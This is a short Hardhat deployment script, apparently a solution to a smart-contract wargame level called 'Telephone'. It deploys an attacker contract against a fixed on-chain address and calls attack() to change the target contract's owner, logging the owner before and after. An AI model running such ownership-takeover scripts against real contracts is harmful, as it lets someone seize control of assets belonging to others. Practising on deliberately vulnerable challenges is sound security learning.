import { ethers } from "hardhat";

async function main() {
  const [deployer] = await ethers.getSigners();

  console.log("Deploying contracts with the account:", deployer.address);

  console.log("Account balance:", (await deployer.getBalance()).toString());

  // We get the contract to deploy
  const Telephone = await ethers.getContractFactory("Telephone");
  const TelephoneAttacker = await ethers.getContractFactory("TelephoneAttacker");
  const telephone = await Telephone.attach("0x37B3dA459716B744985A2c5c9586A03209a4c7bc")
  const telephoneattacker = await TelephoneAttacker.deploy(telephone.address);

  await telephone.deployed();
  await telephoneattacker.deployed();

  console.log("Telephone deployed:", telephone.address);
  console.log("TelephoneAttacker deployed to:", telephoneattacker.address);

  console.log('telephone owner = ', await telephone.owner());
  await telephoneattacker.attack("0xf2A883984D026ab14779fFFe4FB7B1bDB6B02ae3");
  console.log('telephone owner = ', await telephone.owner());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
